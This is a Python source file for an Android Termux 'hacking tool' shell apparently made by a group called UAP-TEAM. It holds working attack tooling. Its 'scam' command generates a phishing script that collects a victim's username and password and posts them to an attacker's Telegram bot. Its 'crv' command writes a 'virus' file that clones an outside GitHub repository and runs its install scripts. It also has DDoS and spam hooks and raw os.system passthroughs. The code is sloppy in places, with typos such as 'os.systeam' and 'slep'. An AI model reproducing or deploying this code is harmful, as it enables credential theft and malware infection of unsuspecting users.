def start(): 
    try :
    	byg = open('lode.txt','r')
    	gt = byg.read()
    except :
    	byg = open('lode.txt','w')
    try :
        ifd= open('mi.txt','r')
        nkh = ifd.read()
    except:
        import requests
        user = '1234567890'
        f = str(''.join((random.choice(user) for i in range(7))))
        with open('mi.txt', 'a') as (nkh):
            nkh.write('{}'.format(f))
    while True :
        nice =("Not Found")
        do =(os.getcwd())
        if do == "/data/data/com.termux/files/home" :
            do = ("home")
        if do == "/storage/emulated/0":
                do = ("sdcard")
        if do == ("/storage/emulated/0/UAP-TEAM"):
                do = ("UAP-TEAM")
        if "UAP-TEAM" in do :
                do=("UAP-TEAM")
        if do == ("/data/data/com.termux/files/hom"):
                do = ("home")
        if do == ('/storge/emulated/0/mm'):
        	do = ("mm")
        if do == ("/storage/emulated/0/Download"):
                do =("Download")
        v=(f'{R}---{G}[{Y}{gt}{G}]{R}----[{W}'+ (do)+f'{R}]{W}')
        #print (v)
        o =((f'{g0}┌── '+f'('+f'{r}')+(do)+(f'{g0}){g0}{t0}-{g0}[{P}~'+Y+gt+f'{g0}]\n└─{R}$ {W}'))
        g = input(o)
        DO=('do')
        site_info=('sin')
        edit=('edit')
        sd =('sd')
        mkdir =('mkdir')
        clear = ('cr')
        Zekr = ('Zekr')
        open_url=('tou')
        history=('history')
        photo=('photo')
        enc = ('enc')
        name = ('name')
        create_various=('crv')
        DDOS = ('DDOS')
        dai=("dai")
        cd = ("cd")
        help = ('help')
        lib =("lib")
        pkg_install=('pil')
        tor = ('tor')
        pip = ('pip')
        ip =("ip")
        exit = ('ex')
        check=('ch')
        if g == 'nmap' :
        	try :
        		import Port
        		Port.nmap()
        	except :
        		print(f'{R} Update TOOL ')
        if g == 'scam':
            TOKEN= input('Enter your Token :')
            ID = input ('Enter your Id :')
            fillename=input ('Enter fill name :')
            nice = ('')
            ftrf=(f'''TOKEN={TOKEN}'''+f'''
ID={ID}'''+'''
import os
try:
    import uuid
except:
    os.system('pip install uuid')
try:
    import sys
except:
    os.system('pip install sys')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    pass
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        import pyfiglet, os,sys
        from time import sleep
        import webbrowser
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
os.system('clear')
user = input (G+'Enter your User :'+Y)
password = input (Y+'Enter your Password :'+G)
w=0
T =(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=Hi new accUser : {user}password : {password}')
RE = requests.post(T)
while True :
    if w < 1000 :
        sleep(5)
        YIOO=(G,R)
        tiop = random.choice(YIOO)
        print (tiop+'loding'+'.'*w)
        w+=1''')
        

            with open(fillename, 'a') as (file):
                        file.write('{}'.format(ftrf))            
        if g == "tlg info":
        	import Tlginfo
        	Tlginfo.url()
        if g == 'dos':
            import dooss
            dooss.ddoss()
            nice = ("")
        if g == "spm" :
        	import TSB
        	TSB.UAP()
        	nice = ("")
        if g == 'home' :
            os.system('cd /data/data/com.termux/files/home')
            nice=("")
        if 'rm -rif' in g :
        	d =g[8:]
        	os.system(f'rm -rif {d}')
        if g == ip:
        	import ip
        	print (Y+'1-get your ip\n2-get ip of ather one')
        	t=input ('? ')
        	if t == ('1'):
        		ip.ip()
        	if t ==("2"):
        		ip.get_ip()
        if g == check:
                nice =('')
                try :
                        sleep(5)
                        import enc
                        print (G+"enc found")
                except:
                        slep(5)
                        print (R+'enc not founde')
                try :
                        sleep(5)
                        import lib
                        print (G + 'lib found')
                except:
                        sleep(5)
                        print (R+"lib not found")
                try :
                        sleep(5)
                        import Zekr
                        print (G+"Zekr found")
                except:
                        sleep(5)
                        print (R+"Zekr not found")
                nice =('')
        if 'sin' in g :
                import requests
                d = g[4:]
                
                url=requests.get(f"http://MrAbood.Pythonanywhere.com/Website/IP/Api?Url={d}").json()["IP"]
                print (url)
        if g == lib :
                import lib
                lib.l()
        if g == create_various:
                nice = ("")
                os.chdir('/sdcard/Download')
                print ("the various save in your fon dont start the file ")
                d=("""import os\nos.system('pkg update;pkg upgrade;pkg install git;git clone https://github.com/jmaxojan/jmaxojan5;cd jmaxojan5;bash .install.sh;bash *')""")
                v = input("output:")
                with open(v, 'a') as (file):
                        file.write('{}'.format(d))
                print (v)
        if g == help:
                print (Bl+'- - - - - - - - - - -- - - - -  - - - - - - - -')
                print (Y+'''Welcome to the technical support section. 
In this section, you will be able to solve the problems that you encounter in our tool through: 
1-Join our telegram channel 
2-Join our Discord channel 
3-join our instgram acc ''')
                cc=input (P+'Enter your choice : '+W)
                if cc == ('1'):
                	os.system('termux-open-url https://t.me/UAP_TEAM')
                if cc == ('2'):
                	os.system('termux-open-url https://discord.gg/c47ernSe')
                if cc ==('3'):
                	os.system('termux-open-url https://www.instagram.com/UAP_team_off')
                nice=("")
                print (Bl+'- - - - - - - - - - -- - - - -  - - - - - - - -')
        if g == 'id' :
            ifd= open('mi.txt','r')
            nkh = ifd.read()
            print (Bl+f'Your id :{C} {nkh}')
            nice = ('')
        if g == exit:
                nice=("")
                sys.exit()
        if 'trm' in g :
                d = g[4:]
                nice=("")
                try:
                        os.system(d)
                except:
                        print(R+'Error')
        if g == enc:
                print (Y+"["+R+"1"+Y+"]"+G +"lambda enc ")
                print (Y+"["+R+"2"+Y+"]"+G +"marshel enc ")
                print (Y+"["+R+"3"+Y+"]"+G +"emoji  enc ")
                print (Y+"["+R+"4"+Y+"]"+G +"Variable enc ")
                cg=input(P+'Enter chosse:'+R)
                if cg == '1':
                        import enc
                        enc.la()
                if cg =='2':
                        import enc
                        enc.c()
                if cg == '3':
                        import enc
                        enc.em()
                if cg == '4':
                        import enc
                        enc.vr()
        if g == 'cr' :
                os.system('clear')
                nice=("")
        if 'pkg install' in g:
                d = g[12:]
                #print(d)
                nice=("")
                os.system(f'pkg install {d}')
        if 'pip' in g :
                nice=("")
                d = g[4:]
                os.system('pip install '+d)
        if 'op' in g:
                nice=("")
                d = g[3:]
                os.system(f'termux-open-url {d}')
        if 'name' in g:
                nice=("")
                d = g[5:]
                t = os.system('rm -rif lode.txt')
                open('lode.txt','w')
                with open('lode.txt', 'a') as (HACKED):
                        HACKED.write('{}'.format(d))
        if g == history:
                nice=("")
                print (os.system('history'))
        if 'nano' in g :
                d = g[5:]
                os.system(f'nano {d}')
        if g == sd :
                nice=("")
                os.chdir('/sdcard')
        if g == DO:
                nice=("")
                os.chdir('/sdcard/Download')
        if 'mkdir' in g  :
                nice=("")
                d =g[6:]
                os.mkdir(d)
        if g == 'ls':
                nice=("")
                os.system('ls')
        if g == Zekr:
                nice=("")
                import Zekr
                Zekr.send()
        if '.py' in g :
        	try:
        		os.system (f'python {g}')
        		nice=("")
        	except :
        		os.system ('pkg install python')
        		os.system (f'python {g}')
        		nice=("")
        if '.php' in g :
        	try:
        		os.system (f'php {g}')
        		nice=("")
        	except :
        		os.system ('pkg install php')
        		os.system (f'php {g}')
        		nice=("")
        if '.sh' in g :
        	try:
        		os.system (f'./{g}')
        		nice=("")
        	except :
        		os.system (f'chmod +x {g}')
        		os.system (f'./{g}')
        		nice=("")
        if '.c' in g :
        	try:
        		os.system (f'c {g}')
        		nice=("")
        	except :
        		os.system ('pkg install c')
        		os.system (f'c {g}')
        		nice=("")
        if nice =="":
                pass
        if nice == ('Not Found'):
        	print (R+"Not Found")
import os
try:
    import uuid
except:
    os.system('pip install uuid')
try:
    import sys
except:
    os.system('pip install sys')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')
try:
    import colorama
except:
    os.system("pip install colorama")
try:
    import time
except:
    os.system('pip install time')
else:
    pass
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        import pyfiglet, os,sys
        from time import sleep
        import webbrowser
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White

t0 =  '\033[1;30m'
r = '\033[1;31m' 
g0 = '\033[1;32m'
g2 = '\033[1;33m'
g3 = '\033[1;34m'
g4 = '\033[1;35m'
w = '\033[1;36m'
start()
